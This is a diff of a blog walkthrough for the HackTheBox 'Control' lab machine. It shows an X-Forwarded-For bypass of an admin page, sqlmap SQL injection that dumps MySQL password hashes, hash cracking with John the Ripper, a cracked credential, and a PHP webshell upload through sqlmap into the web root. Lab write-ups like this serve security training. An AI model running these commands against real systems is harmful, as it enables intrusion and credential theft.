@@ -4,7 +4,7 @@ title: Hackthebox Control Walkthrough
 categories: HackTheBox
 ---
 
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/cascade.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/control.png)
 
 # Explanation
 [Hackthebox](https://www.hackthebox.eu/) is a website which has a bunch of vulnerable machines in its own VPN.<br>
@@ -72,8 +72,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ## 2. Getting User
 
 On the website at port 80, we have a company website.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/cascade.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)
 
+In the body of the HTML code, we have some comments that indicates new payment system is under the development.
 ```shell
 root@kali:~# curl -s http://10.10.10.167 | head -n 20
 <!DOCTYPE html>
@@ -98,20 +99,27 @@ root@kali:~# curl -s http://10.10.10.167 | head -n 20
 		<!-- Header -->
 ```
 
-#### Access Denied.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/cascade.png)
+Try to access `admin.php` we found during web enumeration.<br>
+It looks that to access this page, we need...
+1. A header
+2. To go through a proxy
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-22-16-56-32.png)
 
-#### Add X-Forwarded-for header 
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/cascade.png)
+Then, add an HTTP header `X-Forwarded-For` for all traffic.<br>
+We can use Burp Suite for this purpose.<br>
+The IP address is the one from the HTML comments.
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-11-01-55.png)
 
-#### Admin console
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/cascade.png)
+Now we can access the admin console.
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-22-16-57-36.png)
 
-#### SQL Error using Single Quote
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/cascade.png)
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-07-29/cascade.png)
+Then, try to check if there is any SQL injection.<br>
+By posting a single quote, we can find that this search form is suffering SQLi.
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-22-17-00-44.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-22-17-01-47.png)
 
-#### SQL injection with SQLmap
+Getting additional information using SQLmap.<br>
+First, create the following file from Burp Suite.
 ```shell
 root@kali:~# cat request.txt 
 POST /search_products.php HTTP/1.1
@@ -131,6 +139,9 @@ X-Forwarded-For: 192.168.4.28
 
 productName=singlequote
 ```
+
+Run the following command.<br>
+We can confirm that this DBMS is MySQL and SQL injection here.
 ```shell
 root@kali:~# sqlmap -r request.txt
         ___
@@ -177,7 +188,8 @@ back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 [*] ending @ 18:47:44 /2020-08-22/
 ```
 
-#### Retrieving password hash from MySQL
+After that, run the following command to retrieve password hashes for MySQL.<br>
+We can achieve 3 hashes for `hector`, `manager` and `root`.
 ```shell
 root@kali:~# sqlmap -r request.txt --password
 
@@ -196,7 +208,7 @@ database management system users password hashes:
 [*] ending @ 18:50:54 /2020-08-22/
 ```
 
-#### Cracking the hash with John the Ripper
+Using John the Ripper, we can crack the password hash with `rockyou.txt`.
 ```shell
 root@kali:~# cat hash.txt 
 hector:*0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
@@ -216,12 +228,13 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-#### Credential for user "hector"
+Now we got this credential.
 ```shell
 hector:l33th4x0rhector
 ```
 
-#### Uploading webshell with SQLmap
+Next, to achieve a shell, upload a PHP webshell using the following command.<br>
+We have `simple-backdoor.php` installed on Kali linux.
 ```shell
 root@kali:~# sqlmap -r request.txt --file-write=/usr/share/webshells/php/simple-backdoor.php --file-dest=C:/inetpub/wwwroot/backdoor.php
 
